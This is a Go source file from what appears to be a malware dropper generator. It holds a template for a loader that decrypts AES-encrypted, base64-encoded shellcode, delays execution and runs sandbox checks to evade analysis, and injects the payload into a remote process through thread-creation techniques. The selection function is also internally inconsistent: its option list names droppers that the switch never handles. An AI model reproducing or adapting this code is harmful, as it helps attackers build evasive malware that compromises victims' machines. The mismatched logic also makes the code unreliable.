package remote

import (
	"github.com/Epictetus24/godropit/pkg/dropfmt"
)

var Droppers = []string{"CreateProcess", "CreateProcessWithPipe", "EarlyBird"}

type RemoteDropper struct {
	FuncName   string
	FileName   string
	KeyStr     string //EncryptionKey
	BufStr     string //Base64Shellcodestr
	RemoteProc string //Program Proc to Execute in
	Delay      int
	Dlls       string
	BoxChkFunc string
	BoxChkImp  string
	ChkBox     string
	Inject     string
	Export     string
	Domain     string
	Import     string
	C          string
	ProcAttach string
	Init       string
}

var FuncName = "SystemFunction_032"
var Export = "export"

const RemoteMain = `package main

{{.C}}

import (
	{{.Import}}

	{{.BoxChkImp}}

)
var hope = "{{.Domain}}"

{{.BoxChkFunc}}

{{.ProcAttach}}

func init() {
	{{.ChkBox}}	
	{{.Init}}
}
func main() {

	{{.FuncName}}()

}

//{{.Export}} {{.FuncName}}
func {{.FuncName}}() {

	

	bufstring := "{{.BufStr}}"
	kstring := "{{.KeyStr}}"

	time.Sleep({{.Delay}}* time.Second)

	shellcode, err := box.AESDecrypt(kstring, bufstring)
	if err != nil {
		time.Sleep({{.Delay}}* time.Second)
		os.Exit(0)
	}
	{{.Dlls}}
	{{.Inject}}
}
`

func SelectRemote() (Dlls, Inject, Import, Extra string) {

	_, selected, _ := dropfmt.PromptList(Droppers, "Select the remote dropper you would like to use:")

	switch selected {
	case "CreateRemoteThread":
		Dlls = CreateRemoteThreadDlls
		Inject = CreateRemoteThread
		Import = CreateRemoteThreadImports
	case "CreateRemoteThreadNative":
		Dlls = CreateRemoteThreadNativeDlls
		Inject = CreateRemoteThreadNative
		Import = CreateRemoteThreadNativeImports
	case "RtlCreateUserThread":
		Dlls = RtlCreateUserThreadDlls
		Inject = RtlCreateUserThread
		Import = RtlCreateUserThreadImports
	}

	return Dlls, Inject, Import, Extra
}
